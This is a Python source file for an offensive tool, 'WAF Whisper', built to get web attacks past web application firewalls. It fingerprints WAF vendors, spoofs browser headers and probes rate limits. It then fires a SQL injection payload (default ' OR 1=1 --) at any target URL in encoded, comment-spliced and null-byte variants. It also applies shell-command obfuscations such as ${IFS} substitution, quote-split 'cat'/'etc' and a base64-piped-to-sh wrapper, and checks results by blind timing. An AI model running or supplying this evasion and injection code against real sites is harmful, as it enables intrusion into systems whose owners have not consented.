#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import urllib.parse
import time
import random
import string
import sys
import statistics
from colorama import Fore, Style, init

# Initialize Colorama
init(autoreset=True)

# --------------------------------------------------------------------------------
# CONFIGURATION & CONSTANTS
# --------------------------------------------------------------------------------
VERSION = "5.0.0"
AUTHOR = "R00t3dbyFa17h"
VERSE = '"Behold, I send you forth as sheep in the midst of wolves..." (Matt 10:16)'

# Advanced UA Pool for Ghost Mode
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
]

WAF_SIGNATURES = {
    'Cloudflare': ['__cfduid', 'cf-ray', 'cloudflare'],
    'AWS WAF': ['x-amz-cf-id', 'aws-waf'],
    'Akamai': ['akamai-ghost', 'ak_bmsc'],
    'F5 Big-IP': ['bigipserver', 'f5_traffic_control'],
    'Imperva': ['incap_ses', 'visid_incap'],
    'Barracuda': ['barra_counter_session', 'bn_']
}

def banner():
    print(Fore.CYAN + Style.BRIGHT + f"""
    ██     ██  █████  ███████     ██     ██ ██   ██ ██ ███████ ██████  ███████ ██████  
    ██     ██ ██   ██ ██          ██     ██ ██   ██ ██ ██      ██   ██ ██      ██   ██ 
    ██  █  ██ ███████ █████       ██  █  ██ ███████ ██ ███████ ██████  █████   ██████  
    ██ ███ ██ ██   ██ ██          ██ ███ ██ ██   ██ ██      ██ ██      ██      ██   ██ 
     ███ ███  ██   ██ ██           ███ ███  ██   ██ ██ ███████ ██      ███████ ██   ██ 
                                                                                       
    {Fore.YELLOW}:: Guardrail-Ghost Engine v{VERSION} :: {Fore.WHITE}Adaptive Evasion Framework
    {Fore.RED}:: Created by {AUTHOR} ::
    {Fore.MAGENTA}:: {VERSE} ::
    """)

# --------------------------------------------------------------------------------
# THE GUARDRAIL-GHOST ENGINE
# --------------------------------------------------------------------------------
class GhostEngine:
    def __init__(self, target, proxy=None, delay=0, verbose=False, ghost_mode=False):
        self.target = target
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.delay = delay
        self.verbose = verbose
        self.ghost_mode = ghost_mode
        self.session = requests.Session()
        self.headers = {'User-Agent': USER_AGENTS[0]}
        
        # Operational State
        self.mpl_limit = 8192  # Default Max Payload Length
        self.safe_rpm = 60     # Default Requests Per Minute
        self.baseline_latency = 0.0

    def log(self, message, level="INFO"):
        if level == "INFO": print(f"{Fore.GREEN}[+] {message}")
        elif level == "WARN": print(f"{Fore.YELLOW}[!] {message}")
        elif level == "ERR":  print(f"{Fore.RED}[x] {message}")
        elif level == "DEBUG" and self.verbose: print(f"{Fore.BLUE}[DEBUG] {message}")
        elif level == "GHOST": print(f"{Fore.CYAN}[👻] {message}")

    # PHASE 0: GHOST MODE (Client Emulation)
    def engage_ghost_mode(self):
        if self.ghost_mode:
            self.log("Engaging Guardrail-Ghost Mode...", "GHOST")
            self.headers['User-Agent'] = random.choice(USER_AGENTS)
            self.headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Cache-Control': 'max-age=0'
            })

    # PHASE 1: PASSIVE FINGERPRINTING
    def profile_waf(self):
        self.log(f"Phase 1: Passive Fingerprinting against {self.target}...", "INFO")
        try:
            start_time = time.time()
            r = self.session.head(self.target, headers=self.headers, proxies=self.proxies, verify=False, timeout=10)
            self.baseline_latency = time.time() - start_time
            
            headers_dump = str(r.headers).lower() + str(r.cookies).lower()
            detected = [name for name, sigs in WAF_SIGNATURES.items() if any(sig in headers_dump for sig in sigs)]
            
            if detected:
                self.log(f"WAF Identified: {', '.join(set(detected))}", "WARN")
            else:
                self.log("No signature match. Target is stealthy.", "INFO")
        except Exception as e:
            self.log(f"Connection failed: {str(e)}", "ERR")
            sys.exit(1)

    # PHASE 4: ADAPTIVE RATE LIMIT PROFILING
    def rate_limit_profiler(self):
        self.log("Phase 4: Adaptive Rate Limit Profiling...", "GHOST")
        test_rpms = [120, 60, 30] 
        
        for rpm in test_rpms:
            delay_needed = 60 / rpm
            self.log(f"Probing stability at {rpm} RPM...", "DEBUG")
            blocked = False
            for _ in range(3): 
                try:
                    r = self.session.get(self.target, headers=self.headers, proxies=self.proxies, verify=False)
                    if r.status_code == 429: 
                        blocked = True
                        break
                    time.sleep(delay_needed)
                except: pass
            
            if not blocked:
                self.delay = delay_needed
                self.log(f"Stable Threshold Found: {rpm} RPM (Delay: {self.delay:.2f}s)", "INFO")
                return
        
        self.delay = 6.0
        self.log("Target is sensitive. Defaulting to 10 RPM.", "WARN")

    # PHASE 6A: MPL DISCOVERY (Binary Search)
    def phase_6a_mpl_discovery(self):
        self.log("Phase 6a: Calculating Max Payload Length (MPL)...", "GHOST")
        low, high, mpl = 1, 8192, 0
        
        while low <= high:
            mid = (low + high) // 2
            payload = "A" * mid
            try:
                r = self.session.get(f"{self.target}?q={payload}", headers=self.headers, proxies=self.proxies, verify=False)
                if r.status_code in [413, 414, 403]:
                    high = mid - 1
                else:
                    mpl = mid
                    low = mid + 1
            except:
                high = mid - 1
        
        self.mpl_limit = mpl
        self.log(f"MPL Identified: {self.mpl_limit} bytes", "INFO")

    # PHASE 6B: PAYLOAD FRAGMENTATION
    def phase_6b_fragmentation(self, payload):
        if len(payload) > self.mpl_limit:
            self.log(f"Phase 6b: Payload exceeds MPL. Fragmenting...", "WARN")
            chunks = [payload[i:i+self.mpl_limit] for i in range(0, len(payload), self.mpl_limit)]
            self.log(f"Payload split into {len(chunks)} fragments.", "DEBUG")
            return chunks
        return [payload]

    # PHASE 7A: STANDARD POLYGLOTS
    def phase_7a_standard_mutations(self, payload):
        return {
            "Original": payload,
            "URL Encoded": urllib.parse.quote(payload),
            "Double URL": urllib.parse.quote(urllib.parse.quote(payload)),
            "SQL Comment": payload.replace(" ", "/**/"),
            "Null Byte": payload + "%00"
        }

    # PHASE 7B: SHELL INVERSION (SIGNATURE EVASION)
    def phase_7b_shell_inversions(self, payload):
        return {
            "Zsh Splice": payload.replace("cat", "$(printf 'c'a't')").replace("etc", "$('p'r'intf' 'e't'c')"),
            "IFS Evasion": payload.replace(" ", "${IFS}"),
            "B64 Wrapper": f"echo {urllib.parse.quote(payload)} | base64 -d | sh",
            "Tick Bypass": payload.replace(" ", "``")
        }

    # PHASE 8: EXECUTION & BLIND VERIFICATION
    def execute_whisper(self, payload):
        fragments = self.phase_6b_fragmentation(payload) # Phase 6b
        
        mutations = self.phase_7a_standard_mutations(payload) # Phase 7a
        mutations.update(self.phase_7b_shell_inversions(payload)) # Phase 7b
        
        self.log(f"Whispering {len(mutations)} variants...", "GHOST")
        
        for name, data in mutations.items():
            # Apply Jitter (Phase 0 logic)
            time.sleep(self.delay + random.uniform(0.1, 0.5))
            
            full_url = f"{self.target}?q={data}"
            try:
                req_start = time.time()
                r = self.session.get(full_url, headers=self.headers, proxies=self.proxies, verify=False)
                duration = time.time() - req_start

                # Phase 8: Blind Timing Verification
                if duration > (self.baseline_latency + 4.0):
                    self.log(f"{name}: PASSED (TIME-BASED CONFIRMATION: {duration:.2f}s)", "WARN")
                elif r.status_code == 200:
                    self.log(f"{name}: PASSED (200 OK)", "INFO")
                elif r.status_code == 403:
                    self.log(f"{name}: BLOCKED (403)", "ERR")
            except Exception:
                pass

# --------------------------------------------------------------------------------
# MAIN EXECUTION
# --------------------------------------------------------------------------------
def main():
    banner()
    parser = argparse.ArgumentParser(description='WAF Whisper - Adaptive Evasion Engine')
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-p', '--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--delay', type=float, default=0, help='Manual delay override')
    parser.add_argument('--ghost', action='store_true', help='Enable Guardrail-Ghost Mode')
    parser.add_argument('--payload', default="' OR 1=1 --", help='Attack Payload')

    args = parser.parse_args()

    engine = GhostEngine(args.url, proxy=args.proxy, delay=args.delay, verbose=args.verbose, ghost_mode=args.ghost)

    engine.engage_ghost_mode()      # Phase 0
    engine.profile_waf()            # Phase 1
    
    if args.ghost:
        engine.rate_limit_profiler()    # Phase 4
        engine.phase_6a_mpl_discovery() # Phase 6a
        
    engine.execute_whisper(args.payload) # Phase 6b, 7a, 7b, 8

if __name__ == "__main__":
    main()
